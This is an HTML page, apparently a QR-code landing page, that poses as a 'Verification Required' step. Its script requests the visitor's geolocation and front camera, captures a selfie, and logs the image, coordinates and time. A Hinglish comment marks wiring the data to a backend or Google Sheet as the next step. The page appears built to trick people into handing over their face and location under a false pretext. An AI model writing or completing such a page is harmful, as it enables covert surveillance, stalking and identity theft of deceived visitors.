<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>QR Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0e0e0e;
      font-family: Arial, sans-serif;
      color: #fff;
    }

    .box {
      width: 90%;
      max-width: 360px;
      background: #1c1c1c;
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
    }

    h2 {
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      color: #ccc;
    }

    button {
      width: 100%;
      margin-top: 15px;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      cursor: pointer;
    }

    .allow {
      background: #ffffff;
      color: #000;
    }

    .capture {
      background: #4caf50;
      color: #fff;
    }

    video, canvas {
      width: 100%;
      margin-top: 12px;
      border-radius: 8px;
    }

    .hidden {
      display: none;
    }

    #status {
      margin-top: 10px;
      font-size: 13px;
      color: #9cff9c;
    }
  </style>
</head>

<body>
  <div class="box">
    <h2>Verification Required</h2>
    


    <button class="allow" onclick="startProcess()">Allow & Continue</button>

    <div id="cameraBox" class="hidden">
      <video id="video" autoplay></video>
      <button class="capture" onclick="capturePhoto()">Capture Selfie</button>
      <canvas id="canvas" class="hidden"></canvas>
    </div>

    <div id="status"></div>
  </div>

<script>
  let lat = null;
  let lon = null;

  function startProcess() {
    document.getElementById("status").innerText = "Requesting permissions...";

    // LOCATION
    navigator.geolocation.getCurrentPosition(
      position => {
        lat = position.coords.latitude;
        lon = position.coords.longitude;
      },
      () => alert("Location permission denied")
    );

    // CAMERA
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        document.getElementById("cameraBox").classList.remove("hidden");
        document.getElementById("video").srcObject = stream;
        document.getElementById("status").innerText = "Permissions granted ✔";
      })
      .catch(() => alert("Camera permission denied"));
  }

  function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    const imageData = canvas.toDataURL("image/png");

    console.log("Selfie:", imageData);
    console.log("Location:", lat, lon);
    console.log("Time:", new Date().toLocaleString());

    document.getElementById("status").innerText =
      "Data captured successfully ✅";

    // Yahin se backend / Google Sheet connect hota hai (next step)
  }
</script>
</body>
</html>
